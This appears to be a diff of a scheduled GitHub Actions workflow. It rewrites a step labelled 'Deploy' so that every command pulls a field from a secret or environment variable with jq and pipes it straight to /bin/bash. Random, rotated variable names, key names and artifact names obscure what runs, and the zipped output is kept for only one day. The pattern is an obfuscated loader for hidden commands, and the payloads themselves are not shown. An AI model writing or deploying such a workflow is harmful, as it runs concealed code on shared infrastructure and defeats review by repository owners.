@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '54 3,9,15,21 * * *'
+    - cron: '2 2,8,14,20 * * *'
 permissions:
   contents: read
 jobs:
@@ -16,16 +16,17 @@ jobs:
           fetch-depth: 1
       - name: Deploy
         env:
-          toow6: ${{ secrets.toow6 }}
+          a5: ${{ secrets.a5 }}
         run: |
-          printf '%s' "$toow6" | jq -r .nxodd69 | /bin/bash
-          echo $coe2605 | jq -r .k0 | /bin/bash
-          printf '%s' "$o1" | jq -r .leqhl2440 | /bin/bash
-          printf '%s' "$dgw4870" | jq -r .vkffd86490 | /bin/bash
+          printf '%s' "$a5" | jq -r .uft1 | /bin/bash
+          echo $dyo1 | jq -r .yd92 | /bin/bash
+          echo $pk94 | jq -r .dtsci840 | /bin/bash
+          printf '%s' "$pvdy5" | jq -r .xsomz91 | /bin/bash
+          printf '%s' "$r2538" | jq -r .n82 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
         with:
-          name: kF6VwScT
+          name: VbWiyLSi
           path: "*.zip"
           retention-days: 1
